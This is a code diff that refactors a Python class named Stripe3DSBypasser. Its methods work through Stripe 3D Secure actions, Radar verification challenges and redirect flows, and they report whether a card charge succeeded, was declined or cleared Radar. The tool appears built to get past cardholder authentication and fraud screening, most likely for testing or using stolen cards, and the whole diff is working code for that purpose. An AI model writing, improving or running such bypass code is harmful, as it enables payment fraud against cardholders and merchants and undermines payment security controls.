@@ -232,22 +232,18 @@ class Stripe3DSBypasser:
 
     @classmethod
     def _merge_sdk(cls, next_action: dict) -> dict:
-        use_sdk = next_action.get("use_stripe_sdk") or {}
-        if not isinstance(use_sdk, dict):
-            use_sdk = {}
-        stripe_js_block = use_sdk.get("stripe_js") or next_action.get("stripe_js") or {}
-        if not isinstance(stripe_js_block, dict):
-            stripe_js_block = {}
-        tds2_src_block = use_sdk.get("three_d_secure_2_source") or next_action.get("three_d_secure_2_source") or {}
-        if not isinstance(tds2_src_block, dict):
-            tds2_src_block = {}
-        legacy_block = next_action.get("three_ds_2_intent") or next_action.get("three_d_secure_2_intent") or {}
-        if not isinstance(legacy_block, dict):
-            legacy_block = {}
-        challenge_block = use_sdk.get("three_ds_2_challenge") or next_action.get("three_ds_2_challenge") or {}
-        if not isinstance(challenge_block, dict):
-            challenge_block = {}
-        return {**legacy_block, **tds2_src_block, **challenge_block, **stripe_js_block, **use_sdk}
+        next_action = _as_dict(next_action)
+        use_sdk = _as_dict(next_action.get("use_stripe_sdk"))
+        stripe_js_block = _as_dict(use_sdk.get("stripe_js") or next_action.get("stripe_js"))
+        legacy_block = _as_dict(next_action.get("three_ds_2_intent") or next_action.get("three_d_secure_2_intent"))
+        challenge_block = _as_dict(use_sdk.get("three_ds_2_challenge") or next_action.get("three_ds_2_challenge"))
+
+        tds2_src = use_sdk.get("three_d_secure_2_source") or next_action.get("three_d_secure_2_source")
+        tds2_src_block = tds2_src if isinstance(tds2_src, dict) else {}
+        merged = {**legacy_block, **tds2_src_block, **challenge_block, **stripe_js_block, **use_sdk}
+        if isinstance(tds2_src, str) and tds2_src:
+            merged.setdefault("three_d_secure_2_source", tds2_src)
+        return merged
 
     @classmethod
     def _stripe_headers(cls, profile: dict = None, json_accept: bool = False) -> dict:
@@ -441,31 +437,33 @@ class Stripe3DSBypasser:
             print(f"[3DS] radar verify error: {ex}")
             return {"success": False, "status": "intent_confirmation_challenge", "radar_challenge": True}
 
-        vpi = vj.get("payment_intent") or vj
+        vpi = _as_dict(vj.get("payment_intent") or vj.get("setup_intent") or vj)
         vstat = vpi.get("status")
         if vstat in ("succeeded", "complete", "requires_capture"):
             return {"success": True, "status": vstat, "raw_response": vj}
         if vstat == "requires_payment_method":
-            verr = (
+            verr_raw = (
                 vpi.get("last_payment_error")
                 or vpi.get("last_setup_error")
                 or vj.get("last_payment_error")
                 or vj.get("error")
                 or {}
             )
+            verr = _as_dict(verr_raw)
+            verr_msg = verr.get("message") if verr else (str(verr_raw) if verr_raw else "Card declined")
             return {
                 "success": False,
                 "status": "declined",
                 "decline_code": verr.get("decline_code") or verr.get("code") or "card_declined",
-                "error": verr.get("message") or "Card declined",
+                "error": verr_msg,
                 "raw_response": vj,
             }
         if vstat in ("requires_action", "requires_source_action"):
-            new_na = vpi.get("next_action") or vj.get("next_action")
+            new_na = _as_dict(vpi.get("next_action") or vj.get("next_action"))
             new_cs = vpi.get("client_secret") or client_secret
-            if new_na and isinstance(new_na, dict):
+            if new_na:
                 if new_na.get("type") == "redirect_to_url":
-                    red_url = (new_na.get("redirect_to_url") or {}).get("url")
+                    red_url = _as_dict(new_na.get("redirect_to_url")).get("url")
                     return await cls._resolve_redirect_url(session, red_url, pi_id, new_cs, pk_key, profile, depth + 1)
                 return await cls._resolve_3ds2_sdk(session, new_na, new_cs, pk_key, profile, depth + 1)
             return {"success": False, "status": vstat, "radar_cleared": True, "raw_response": vj}
@@ -547,12 +545,12 @@ class Stripe3DSBypasser:
             or sdk_data.get("server_transaction_id")
             or sdk_data.get("threeDSServerTransID")
         )
-        ds = sdk_data.get("directory_server_information") or {}
+        ds = _as_dict(sdk_data.get("directory_server_information"))
         method_url = (
             sdk_data.get("three_ds_method_url")
             or sdk_data.get("methodURL")
             or sdk_data.get("method_url")
-            or (ds.get("three_ds_method_url") if isinstance(ds, dict) else None)
+            or ds.get("three_ds_method_url")
         )
         notify_url = (
             sdk_data.get("three_ds_method_notification_url")
@@ -653,7 +651,7 @@ class Stripe3DSBypasser:
                 if na:
                     if na.get("type") == "redirect_to_url":
                         return await cls._resolve_redirect_url(
-                            session, (na.get("redirect_to_url") or {}).get("url"),
+                            session, _as_dict(na.get("redirect_to_url")).get("url"),
                             pi_id, client_secret, pk_key, profile, depth + 1,
                         )
                     inner = na.get("use_stripe_sdk") or na
@@ -846,7 +844,7 @@ class Stripe3DSBypasser:
             if updated_na and isinstance(updated_na, dict):
                 act = updated_na.get("type", "")
                 if act == "redirect_to_url":
-                    red_url = (updated_na.get("redirect_to_url") or {}).get("url")
+                    red_url = _as_dict(updated_na.get("redirect_to_url")).get("url")
                     return await cls._resolve_redirect_url(
                         session, red_url, pi_id, updated_cs, pk_key, profile, depth=depth + 1)
                 return await cls._resolve_3ds2_sdk(
@@ -924,7 +922,7 @@ class Stripe3DSBypasser:
                     if act_type in ("use_stripe_sdk", "stripe_3ds2_fingerprint", "stripe_3ds2_challenge") or "use_stripe_sdk" in next_action:
                         outcome = await cls._resolve_3ds2_sdk(sess, next_action, client_secret, pk_key, profile, depth=0)
                     elif act_type == "redirect_to_url":
-                        redirect_url = (next_action.get("redirect_to_url") or {}).get("url")
+                        redirect_url = _as_dict(next_action.get("redirect_to_url")).get("url")
                         outcome = await cls._resolve_redirect_url(sess, redirect_url, pi_id, client_secret, pk_key, profile, depth=0)
 
                 if outcome and outcome.get("success"):
